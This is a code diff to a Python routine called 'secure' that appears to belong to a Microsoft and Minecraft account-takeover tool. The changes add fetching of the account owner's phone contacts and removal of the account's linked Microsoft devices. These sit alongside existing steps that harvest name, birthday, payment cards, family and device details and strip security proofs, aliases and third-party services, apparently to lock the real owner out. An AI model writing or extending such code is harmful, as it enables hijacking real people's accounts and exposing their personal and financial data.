@@ -3,6 +3,7 @@ from securing.utils.security.add_authenticator import add_authenticator
 from securing.utils.security.get_recovery_code import get_recovery_code
 from securing.utils.security_information import security_information
 from securing.utils.security.remove_services import remove_services
+from securing.utils.security.remove_devices import remove_devices
 from securing.utils.security.delete_aliases import delete_aliases
 from securing.utils.security.remove_proof import remove_proof
 from securing.utils.security.remove_zyger import remove_zyger
@@ -14,6 +15,7 @@ from securing.utils.ogi.get_owner_info import get_owner_info
 from securing.utils.ogi.get_devices import get_devices
 from securing.utils.ogi.get_family import get_family
 from securing.utils.ogi.get_cards import get_cards
+from securing.utils.ogi.get_contacts import get_contacts
 
 from securing.utils.cookies.get_cookies import get_cookies
 from securing.utils.cookies.get_amc import get_amc
@@ -46,7 +48,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     domain = config["domain"]
     
     # Token needed to make API requests for the account
-    verification_token = await get_amc(session)
+    verification_tokens = await get_amc(session)
 
     apicanary = await get_cookies(session) 
     
@@ -102,20 +104,22 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
         accountInfo["minecraft"]["name"] = "No Minecraft"
 
     # Gets account info via microsofts API
-    subscriptions = await get_subscriptions(session, verification_token[0])
-    family = await get_family(session, verification_token[0])
-    devices = await get_devices(session, verification_token[0])
-    cards = await get_cards(session, verification_token[0])
+    subscriptions = await get_subscriptions(session, verification_tokens[0])
+    family = await get_family(session, verification_tokens[0])
+    devices = await get_devices(session, verification_tokens[0])
+    cards = await get_cards(session, verification_tokens[0])
+    contacts = await get_contacts(session, verification_tokens[0])
 
-    owner_info = await get_owner_info(session, verification_token[1])
+    owner_info = await get_owner_info(session, verification_tokens[1])
 
     print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
     accountInfo["microsoft"]["firstName"] = owner_info["firstName"]
-    accountInfo["microsoft"]["lastName"]  = owner_info["lastName"]
-    accountInfo["microsoft"]["fullName"]  = owner_info["fullName"]
-    accountInfo["microsoft"]["region"]    = owner_info["region"]
-    accountInfo["microsoft"]["birthday"]  = owner_info["birthday"]
-    accountInfo["microsoft"]["language"]  = owner_info["msaDisplayLanguage"]
+    accountInfo["microsoft"]["lastName"] = owner_info["lastName"]
+    accountInfo["microsoft"]["fullName"] = owner_info["fullName"]
+    accountInfo["microsoft"]["region"] = owner_info["region"]
+    accountInfo["microsoft"]["birthday"] = owner_info["birthday"]
+    accountInfo["microsoft"]["language"] = owner_info["msaDisplayLanguage"]
+    accountInfo["microsoft"]["phones"] = contacts["msaPhones"] + contacts["mmxPhones"]
 
     accountInfo["microsoft"]["family"] = family["members"]
     accountInfo["microsoft"]["devices"] = devices["devices"]
@@ -138,6 +142,9 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     
     # Third Party Launchers (Minecraft, Prism)
     await remove_services(session)
+
+    # Remove Microsoft Devices
+    await remove_devices(session, verification_tokens[2], devices)
 
     securityParameters = json.loads(await security_information(session))
     print("[+] - Got Security Parameters")
